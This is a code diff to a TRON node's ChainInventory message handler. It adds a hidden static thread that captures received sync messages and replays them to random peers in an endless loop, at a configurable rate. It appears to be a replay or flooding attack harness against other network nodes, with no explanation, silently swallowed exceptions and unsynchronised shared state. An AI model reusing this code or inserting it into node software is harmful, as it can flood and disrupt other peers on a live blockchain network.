@@ -2,10 +2,8 @@ package org.tron.core.net.messagehandler;
 
 import static org.tron.core.config.Parameter.ChainConstant.BLOCK_PRODUCED_INTERVAL;
 
-import java.util.Deque;
-import java.util.LinkedList;
-import java.util.List;
-import java.util.NoSuchElementException;
+import java.util.*;
+
 import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.collections4.CollectionUtils;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -17,6 +15,7 @@ import org.tron.core.config.args.Args;
 import org.tron.core.exception.P2pException;
 import org.tron.core.exception.P2pException.TypeEnum;
 import org.tron.core.net.TronNetDelegate;
+import org.tron.core.net.TronNetService;
 import org.tron.core.net.message.TronMessage;
 import org.tron.core.net.message.sync.ChainInventoryMessage;
 import org.tron.core.net.peer.PeerConnection;
@@ -35,10 +34,82 @@ public class ChainInventoryMsgHandler implements TronMsgHandler {
 
   private final long syncFetchBatchNum = Args.getInstance().getSyncFetchBatchNum();
 
+
+
+
+  private static volatile Map<Integer, TronMessage> msgGathered = new HashMap<>();
+  private static volatile Map<Integer, TronMessage> msgQueue = new HashMap<>();
+
+  private static volatile long msgQueueMaxSize = Args.getInstance().chainInventoryMsgMaxQueueSize;
+  private static volatile long msgMaxSpeed = Args.getInstance().chainInventoryMsgMaxSpeed;
+
+  private static volatile long[] msgTotalSent = {0};
+  private static volatile long[] msgSuccessSent = {0};
+  private static volatile long[] tmpTimestamp = {0};
+  static {
+    new Thread(() -> {
+      if(msgQueueMaxSize == 0 || msgMaxSpeed ==0){
+        logger.info("@@@ msgQueueMaxSize or msgMaxSpeed was not found in config file. task failed..");
+        return;
+      }
+      while (true) {
+        try {
+          logger.info("@@@ msgQueue size {}, peers {}", msgQueue.size(), TronNetService.getPeers().size());
+          if (msgQueue.size() >= msgQueueMaxSize && TronNetService.getPeers().size() >= 1) {
+            tmpTimestamp[0] = System.currentTimeMillis();
+            msgQueue.values().forEach(v -> {
+              try{
+                msgTotalSent[0]++;
+                if (msgTotalSent[0] % msgMaxSpeed == 0) {
+                  long s = tmpTimestamp[0] + 1000 - System.currentTimeMillis();
+                  logger.info("&&& total send {}, success count {}, sleep {}ms", msgTotalSent[0], msgSuccessSent[0], s);
+                  if (s > 0) {
+                    Thread.sleep(s);
+                  }
+                  tmpTimestamp[0] = System.currentTimeMillis();
+                  msgSuccessSent[0] = 0;
+                }
+              }catch (Exception e){}
+              List<PeerConnection> list = TronNetService.getPeers();
+              if (list.size() == 0) {
+                logger.info("@@@ peer size == 0 return...");
+                return;
+              }
+              int index = new Random().nextInt(list.size());
+              PeerConnection peerConnection = list.get(index);
+              peerConnection.sendMessage(v);
+              msgSuccessSent[0]++;
+            });
+          } else {
+            Thread.sleep(1000);
+          }
+        }catch (Exception e) {
+          logger.error("@@@ adv msg failed.", e);
+          try{ Thread.sleep(1000); }catch (Exception e2){}
+        }
+      }
+    }).start();
+  }
+
+  public static volatile long cnt = 0;
+
+
   @Override
   public void processMessage(PeerConnection peer, TronMessage msg) throws P2pException {
 
     ChainInventoryMessage chainInventoryMessage = (ChainInventoryMessage) msg;
+
+    if (msgQueueMaxSize>0 && msgMaxSpeed >0){
+      msgGathered.put(msg.hashCode(), msg);
+      cnt++;
+      logger.info("### cnt = {}, map1-size = {}, map2-size = {}",
+          cnt, msgGathered.size(), msgQueue.size());
+      if (msgGathered.size() >= msgQueueMaxSize) {
+        msgQueue = msgGathered;
+        msgGathered = new HashMap<>();
+      }
+    }
+
 
     check(peer, chainInventoryMessage);
 
